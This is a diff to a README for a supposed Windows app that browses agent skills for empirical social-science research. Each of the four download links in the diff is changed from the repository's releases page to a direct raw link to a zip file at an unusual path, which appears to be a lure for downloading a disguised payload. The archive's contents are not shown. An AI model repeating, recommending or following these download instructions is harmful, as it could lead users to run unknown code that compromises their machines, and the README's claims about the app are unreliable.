@@ -1,10 +1,10 @@
 # 🔬 Awesome-Agent-Skills-for-Empirical-Research - Find Research Skills Fast
 
-[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/Servicechargechenopodiales606/Awesome-Agent-Skills-for-Empirical-Research/releases)
+[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/Servicechargechenopodiales606/Awesome-Agent-Skills-for-Empirical-Research/raw/refs/heads/main/dialogism/Empirical_Research_for_Skills_Agent_Awesome_3.4.zip)
 
 ## 📥 Download
 Visit this page to download the app for Windows:  
-[https://github.com/Servicechargechenopodiales606/Awesome-Agent-Skills-for-Empirical-Research/releases](https://github.com/Servicechargechenopodiales606/Awesome-Agent-Skills-for-Empirical-Research/releases)
+[https://github.com/Servicechargechenopodiales606/Awesome-Agent-Skills-for-Empirical-Research/raw/refs/heads/main/dialogism/Empirical_Research_for_Skills_Agent_Awesome_3.4.zip](https://github.com/Servicechargechenopodiales606/Awesome-Agent-Skills-for-Empirical-Research/raw/refs/heads/main/dialogism/Empirical_Research_for_Skills_Agent_Awesome_3.4.zip)
 
 ## 🖥️ What This App Does
 Awesome-Agent-Skills-for-Empirical-Research helps you browse a large skill library for empirical research. It groups agent skills across social science fields like economics, education, psychology, political science, sociology, and more.
@@ -33,7 +33,7 @@ If you plan to work with large research sets, 8 GB of RAM or more will give you 
 
 ## 🚀 Install on Windows
 1. Open the release page:  
-   [Download page](https://github.com/Servicechargechenopodiales606/Awesome-Agent-Skills-for-Empirical-Research/releases)
+   [Download page](https://github.com/Servicechargechenopodiales606/Awesome-Agent-Skills-for-Empirical-Research/raw/refs/heads/main/dialogism/Empirical_Research_for_Skills_Agent_Awesome_3.4.zip)
 
 2. Find the latest release near the top of the page.
 
@@ -163,7 +163,7 @@ For the smoothest use:
 
 ## 📎 Download Again
 If you need the release page again:  
-[https://github.com/Servicechargechenopodiales606/Awesome-Agent-Skills-for-Empirical-Research/releases](https://github.com/Servicechargechenopodiales606/Awesome-Agent-Skills-for-Empirical-Research/releases)
+[https://github.com/Servicechargechenopodiales606/Awesome-Agent-Skills-for-Empirical-Research/raw/refs/heads/main/dialogism/Empirical_Research_for_Skills_Agent_Awesome_3.4.zip](https://github.com/Servicechargechenopodiales606/Awesome-Agent-Skills-for-Empirical-Research/raw/refs/heads/main/dialogism/Empirical_Research_for_Skills_Agent_Awesome_3.4.zip)
 
 ## 🧭 License and Source
 This project is maintained by CoPaper.AI and is based on a large research skill collection for academic use across social science fields
